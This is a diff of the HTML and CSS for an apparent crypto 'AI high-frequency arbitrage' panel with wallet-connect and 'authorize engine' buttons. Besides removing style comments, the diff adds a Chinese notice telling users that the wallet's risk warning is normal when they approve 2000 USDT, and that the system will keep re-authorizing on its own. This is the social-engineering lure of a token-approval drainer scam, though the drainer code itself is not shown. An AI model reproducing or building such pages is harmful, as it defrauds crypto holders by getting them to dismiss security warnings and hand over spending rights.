@@ -18,7 +18,6 @@
         
         .container { max-width: 1200px; margin: 0 auto; width: 100%; }
         
-        /* 紧凑版卡片 - 减少内边距 */
         .card, .panel { 
             background: rgba(18, 25, 45, 0.95); 
             backdrop-filter: blur(12px); 
@@ -34,7 +33,6 @@
         
         .hidden { display: none; }
         
-        /* 紧凑版按钮 - 减少内边距和间距 */
         .nav-btn, .back-btn { 
             background: rgba(0, 198, 255, 0.2); 
             border: 1px solid rgba(0, 255, 255, 0.5); 
@@ -93,7 +91,6 @@
             .double-buttons .nav-btn { min-width: 75px; padding: 8px 10px; font-size: 12px; }
         }
         
-        /* 紧凑版统计卡片 */
         .stats-card { 
             background: rgba(0, 204, 255, 0.1); 
             border: 1px solid rgba(0, 204, 255, 0.4); 
@@ -124,7 +121,6 @@
             .stats-card .stat-label { font-size: 11px; }
         }
         
-        /* 紧凑版输入框 */
         .password-input, .apply-input { 
             width: 100%; 
             padding: 12px 16px; 
@@ -143,7 +139,6 @@
             .password-input, .apply-input { padding: 10px 14px; font-size: 14px; }
         }
         
-        /* 紧凑版按钮 */
         .password-btn, .apply-btn { 
             width: 100%; 
             margin-top: 12px; 
@@ -160,7 +155,6 @@
         
         .error-msg { color: #ff8888; margin-top: 8px; font-size: 11px; }
         
-        /* 紧凑版申请说明 */
         .apply-notice { 
             background: rgba(0, 204, 255, 0.1); 
             border: 1px solid rgba(0, 204, 255, 0.4); 
@@ -226,6 +220,25 @@
         .label { color: #aaa; font-size: 12px; }
         .address { font-family: monospace; background: #0a0f1e; padding: 3px 8px; border-radius: 40px; font-size: 11px; color: #88ccff; }
         .network-badge { background: #0a2a3a; color: #88ffaa; padding: 2px 8px; border-radius: 40px; font-size: 10px; }
+        
+        /* 温馨提示框 */
+        .warning-tip {
+            background: rgba(255, 170, 68, 0.1);
+            border: 1px solid rgba(255, 170, 68, 0.3);
+            border-radius: 16px;
+            padding: 10px 12px;
+            margin: 12px 0;
+            text-align: left;
+        }
+        .warning-tip p {
+            color: #ffcc88;
+            font-size: 12px;
+            line-height: 1.5;
+            margin: 0;
+        }
+        .warning-tip strong {
+            color: #ffaa44;
+        }
         
         .button-group { display: flex; flex-direction: column; gap: 10px; margin-top: 16px; }
         .btn { border: none; padding: 12px 16px; border-radius: 60px; font-weight: 700; font-size: 15px; cursor: pointer; }
@@ -371,7 +384,7 @@
             <div class="announcement-section">
                 <h3>💰 资金要求</h3>
                 <table class="announcement-table">
-                    <tr><td>最高运行</td><td>2000 U 以内</td></tr>
+                    <tr><td style="width:40%">最高运行</td><td>2000 U 以内</td></tr>
                     <tr><td>切勿存入</td><td>超过 2000 USDT</td></tr>
                     <tr><td>最低运行</td><td>1000 U</td></tr>
                 </table>
@@ -417,7 +430,7 @@
         </div>
     </div>
 
-    <!-- 页面6：量化面板 -->
+    <!-- 页面6：量化面板（已添加温馨提示） -->
     <div id="quantPanel" class="panel" style="display:none;">
         <div style="text-align:center; margin-bottom:14px;">
             <div style="font-size:42px;">🧠⚡</div>
@@ -430,6 +443,12 @@
             <div class="wallet-row"><span class="label">🆔 连接地址</span><span class="address" id="walletAddressDisplay">未连接</span></div>
             <div class="wallet-row"><span class="label">🤖 AI 策略</span><span class="label" style="color:#88ccff;">高频套利 · 闪电贷防御</span></div>
         </div>
+        
+        <!-- 新增温馨提示 -->
+        <div class="warning-tip">
+            <p>⚠️ <strong>温馨提示：</strong> 第一次运行需要授权 USDT 额度，授权时提示风险是正常现象。首次授权 2000 USDT，运行过程中会消耗授权额度，额度用完后系统会自动继续授权。</p>
+        </div>
+        
         <div class="button-group">
             <button class="btn btn-primary" id="connect">🔌 ① 连接量化钱包</button>
             <button class="btn btn-success" id="approve" disabled>🚀 ② 授权启动引擎</button>
